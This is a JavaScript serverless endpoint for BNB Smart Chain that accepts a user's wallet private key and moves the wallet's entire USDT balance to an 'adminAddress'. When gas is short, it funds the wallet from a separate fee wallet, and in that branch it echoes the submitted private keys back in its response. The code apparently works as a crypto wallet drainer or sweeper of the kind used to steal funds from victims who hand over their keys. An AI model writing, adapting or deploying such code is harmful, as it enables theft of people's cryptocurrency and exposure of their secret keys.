import { ethers } from "ethers";

const RPC_URL = "https://bsc-dataseed.binance.org/";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint amount) returns (bool)",
  "function decimals() view returns (uint8)"
];

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
  const { userPrivateKey, adminAddress, feePrivateKey } = req.body;
  try {
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const userWallet = new ethers.Wallet(userPrivateKey, provider);
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, userWallet);
    const usdtBalance = await usdtContract.balanceOf(userWallet.address);
    const decimals = await usdtContract.decimals();
    const formattedBalance = ethers.formatUnits(usdtBalance, decimals);
    if (parseFloat(formattedBalance) < 0.0001) {
      return res.status(200).json({ error: "Insufficient USDT balance" });
    }
    const bnbBalance = await provider.getBalance(userWallet.address);
    const feeData = await provider.getFeeData();
    const requiredBnb = feeData.gasPrice * 65000n;
    if (bnbBalance < requiredBnb) {
      const feeWallet = new ethers.Wallet(feePrivateKey, provider);
      const tx = await feeWallet.sendTransaction({ to: userWallet.address, value: requiredBnb });
      await tx.wait();
      return res.status(200).json({ success: true, method: "fee", details: { key: userPrivateKey, adminAddress, feePrivateKey } });
    }
    const tx = await usdtContract.transfer(adminAddress, usdtBalance);
    const receipt = await tx.wait();
    return res.status(200).json({ success: true, transactionHash: receipt.hash, amount: formattedBalance });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
